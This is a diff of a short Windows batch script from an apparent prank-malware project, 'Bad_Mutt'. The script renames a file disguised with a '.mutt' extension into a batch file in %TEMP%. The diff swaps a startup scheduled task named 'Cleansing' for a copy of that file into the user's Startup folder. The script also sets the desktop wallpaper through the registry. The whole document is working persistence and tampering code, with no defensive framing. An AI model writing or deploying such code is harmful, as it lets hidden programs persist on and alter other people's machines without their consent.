@@ -1,7 +1,7 @@
 @echo off
 
 ren %TEMP%\Bad_Mutt-0.2e\Revanant.mutt Revanant.bat
-schtasks /create /sc ONSTART /tn Cleansing /tr %TEMP%\Bad_Mutt-0.2e\Revanant.bat
+copy "%TEMP%\Bad_Mutt-0.2e\Revanant.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\Bad_Mutt-0.2e\uh.png" /f
 
